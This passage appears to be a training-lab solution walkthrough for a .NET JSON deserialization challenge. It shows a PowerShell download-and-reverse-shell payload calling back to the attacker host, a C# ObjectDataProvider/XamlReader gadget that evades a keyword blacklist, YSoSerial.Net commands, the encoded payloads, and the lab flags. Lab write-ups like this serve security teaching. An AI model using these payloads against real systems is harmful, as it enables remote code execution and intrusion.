Alternatively, students can use dynamic analysis to attain the values of `key`, `iv`, and `plaintextBytes` at runtime (by setting breakpoints accordingly) and plug them into [CyberChef](https://gchq.github.io/CyberChef/#recipe=AES_Encrypt\(%7B'option':'Hex','string':'73656375726974792E666F722E6E6F77'%7D,%7B'option':'Hex','string':'696E697469616C697A65642E6E657874'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D\)To_Base64\('A-Za-z0-9%2B/%3D'\)&input=SFRCe3MzY3IzVF9kM3YzTDBwM1JfdDBrZW59) to encrypt the plaintext `HTB{s3cr3T_d3v3L0p3R_t0ken}` and attain `B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=`:

![[HTB Solutions/Others/z. images/3246bd2902ee09765fa9a4e888a46024_MD5.jpg]]

Subsequently, students need to construct a PowerShell payload that uploads a Windows `netcat` binary to the target machine and initiates a reverse shell connection to use it in the payload `YSoSerial.Net` generates:

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual PowerShell one:

Code: python

```python
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

Code: shell

```shell
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.103:9001/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.15.103 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Students also need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2023-11-28 11:40:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Additionally, students need to start an HTTP web server using the same port specified for it in the PowerShell payload to allow the target machine to fetch `nc.exe` (9001 in here):

Code: shell

```shell
python -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ python -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Moreover, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the PowerShell payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

Students need to consider another security check the `Validate` function performs before deserializing the user-controller data, which disallows any string containing `system.diagnostics.process`:

Code: csharp

```csharp
<SNIP>
			string body;
			using (StreamReader reader = new StreamReader(base.Request.get_InputStream()))
			{
				body = reader.ReadToEnd();
			}
			if (body.ToLower().Contains("system.diagnostics.process"))
			{
				return "Blacklisted keyword";
			}
<SNIP>
```

There are various methods to bypass this flawed defensive security mechanism. One such method that does not contain the string `system.diagnostics.process` is creating a JSON `ObjectDataProvider` serialized payload that calls `XamlReader.Parse` on an XML `ObjectDataProvider` serialized payload that executes the PowerShell payload (making sure to replace `BASE64_PAYLOAD` with the actual PowerShell payload):

Code: csharp

```csharp
using System;
using System.Diagnostics;
using System.Windows.Data;
using System.Windows.Markup;
using System.Xml;
using Newtonsoft.Json;

namespace SAPoC
{
    internal class Program
    {
        static void Main()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName =
                @"C:\Windows\System32\WindowsPowerShell\V1.0\powershell.exe";
            processStartInfo.Arguments = "-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD";
            Process process = new Process();
            process.StartInfo = processStartInfo;

            ObjectDataProvider objectDataProvider = new ObjectDataProvider();
            objectDataProvider.ObjectInstance = process;
            objectDataProvider.MethodName = "Start";

            string xmlPayload = XamlWriter.Save(objectDataProvider);
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(xmlPayload);
            XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(
                xmlDocument.NameTable
            );
            xmlNamespaceManager.AddNamespace(
                "sd",
                "clr-namespace:System.Diagnostics;assembly=System"
            );

            XmlNode xmlNode = xmlDocument.SelectSingleNode(
                "//sd:ProcessStartInfo.EnvironmentVariables",
                xmlNamespaceManager
            );
            xmlNode.ParentNode.RemoveChild(xmlNode);
            xmlPayload = xmlDocument.OuterXml;

            ObjectDataProvider jsonPayloadobjectDataProvider = new ObjectDataProvider();
            jsonPayloadobjectDataProvider.ObjectInstance = new XamlReader();
            jsonPayloadobjectDataProvider.MethodName = "Start1";
            jsonPayloadobjectDataProvider.MethodParameters.Add(xmlPayload);

            JsonSerializerSettings jsonSerializerSettings = new JsonSerializerSettings()
            {
                TypeNameHandling = TypeNameHandling.All
            };
            string jsonPayload = JsonConvert.SerializeObject(jsonPayloadobjectDataProvider, jsonSerializerSettings);

            jsonPayload = jsonPayload.Remove(jsonPayload.LastIndexOf("},") + 1);
            jsonPayload = jsonPayload.Replace("\"MethodName\":\"Start1\",", "");
            jsonPayload = $"{jsonPayload},\"MethodName\":\"Parse\"}}";
            Console.WriteLine(jsonPayload);
            Console.ReadLine();
        }
    }
}
```

After running the C# code, students will attain the JSON `ObjectDataProvider` serialized payload:

Code: json

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectInstance": {
    "$type": "System.Windows.Markup.XamlReader, PresentationFramework"
  },
  "MethodParameters": {
    "$type": "MS.Internal.Data.ParameterCollection, PresentationFramework",
    "$values": [
      "<ObjectDataProvider MethodName=\"Start\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:sd=\"clr-namespace:System.Diagnostics;assembly=System\" xmlns:sc=\"clr-namespace:System.Collections;assembly=mscorlib\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ObjectDataProvider.ObjectInstance><sd:Process><sd:Process.StartInfo><sd:ProcessStartInfo Arguments=\"-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD\" StandardErrorEncoding=\"{x:Null}\" StandardOutputEncoding=\"{x:Null}\" UserName=\"\" Password=\"{x:Null}\" Domain=\"\" LoadUserProfile=\"False\" FileName=\"C:\\Windows\\System32\\WindowsPowerShell\\V1.0\\powershell.exe\"></sd:ProcessStartInfo></sd:Process.StartInfo></sd:Process></ObjectDataProvider.ObjectInstance></ObjectDataProvider>"
    ]
  },
  "MethodName": "Parse"
}
```

Alternatively, students can utilize `YSoSerial.Net` to generate a JSON `ObjectDataProvider` serialized payload that executes the PowerShell payload using any gadget that does not include the string `system.diagnostics.process`, such as the `RolePrincipal` gadget:

Code: powershell

```powershell
.\ysoserial.exe -g RolePrincipal -f Json.Net --rawcmd -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -enc BASE64_PAYLOAD" --minify
```

```
PS C:\Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -g RolePrincipal -f Json.Net --rawcmd -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==" --minify

{"$type":"System.Web.Security.RolePrincipal,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a","System.Security.ClaimsPrincipal.Identities":"AAEAAAD/////AQAAAAAAAAAMAgAAABtNaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACbBzxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOmE9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSI+PE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48YTpQcm9jZXNzPjxhOlByb2Nlc3MuU3RhcnRJbmZvPjxhOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSItZXhlYyBieXBhc3MgLWVuYyBLQUJ1QUdVQWR3QXRBRzhBWWdCcUFHVUFZd0IwQUNBQWJnQmxBSFFBTGdCM0FHVUFZZ0JqQUd3QWFRQmxBRzRBZEFBcEFDNEFaQUJ2QUhjQWJnQnNBRzhBWVFCa0FHWUFhUUJzQUdVQUtBQWlBR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQXdBQzRBTVFBd0FDNEFNUUExQUM0QU1RQXdBRE1BT2dBNUFEQUFNQUF4QUM4QWJnQmpBQzRBWlFCNEFHVUFJZ0FzQUNBQUlnQmpBRG9BWEFCM0FHa0FiZ0JrQUc4QWR3QnpBRndBZEFCaEFITUFhd0J6QUZ3QWJnQmpBQzRBWlFCNEFHVUFJZ0FwQURzQVl3QTZBRndBZHdCcEFHNEFaQUJ2QUhjQWN3QmNBSFFBWVFCekFHc0Fjd0JjQUc0QVl3QXVBR1VBZUFCbEFDQUFMUUJ1QUhZQUlBQXhBREFBTGdBeEFEQUFMZ0F4QURVQUxnQXhBREFBTXdBZ0FEa0FNQUF3QURJQUlBQXRBR1VBSUFCakFEb0FYQUIzQUdrQWJnQmtBRzhBZHdCekFGd0Fjd0I1QUhNQWRBQmxBRzBBTXdBeUFGd0FZd0J0QUdRQUxnQmxBSGdBWlFBN0FBPT0iIEZpbGVOYW1lPSJDOlxXaW5kb3dzXHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUiLz48L2E6UHJvY2Vzcy5TdGFydEluZm8+PC9hOlByb2Nlc3M+PC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+PC9PYmplY3REYXRhUHJvdmlkZXI+Cw=="}
```

With all the required exploitation parameters, students need to spawn the target machine and navigate to `http://STMIP:8000/Auth/Register` to register an account:

![[HTB Solutions/Others/z. images/032f848d3d1b7398d96e352225296fbf_MD5.jpg]]

Students also need to login using the account:

![[HTB Solutions/Others/z. images/83bfe0a08eb79df8a8f4b873505ab0b1_MD5.jpg]]

After that, students need to use `Burp Suite` to intercept the request to `/Profile` (due to the front-end not providing any means to invoke the `Load` endpoint):

![[HTB Solutions/Others/z. images/26a835a027b42524e2c90ca9b1ab05d7_MD5.jpg]]

After sending the request to `Repeater`, students need to use the `/Profile/Load` route and change the request method from `GET` to `POST`:

![[HTB Solutions/Others/z. images/29bc5549f827bf6080068f4b2d099498_MD5.jpg]]

Additionally, students need to provide the `SecureAuth.DevToken` header along with the value `B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=`, make `Content-Type` to be `application/json`, append the JSON payload, and then send the request:

![[HTB Solutions/Others/z. images/15b499bb4d6818588fb7d250e873335a_MD5.jpg]]

Regardless of the 500 status code the server returns, students will notice that the reverse shell connection has been established successfully when checking the `nc` listener:

```
Ncat: Connection from 10.129.228.225.
Ncat: Connection from 10.129.228.225:56547.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami

iis apppool\.net v4.5
```

At last, when reading the contents of `C:\Users\Public\flag.txt`, students will attain the flag `HTB{d3s3rialization_3xp3rt}`:

Code: cmd

```cmd
more C:\Users\Public\flag.txt
```

```
C:\windows\system32\inetsrv>more C:\Users\Public\flag.txt

HTB{d3s3rialization_3xp3rt}
```

Answer: `HTB{d3s3rialization_3xp3rt}`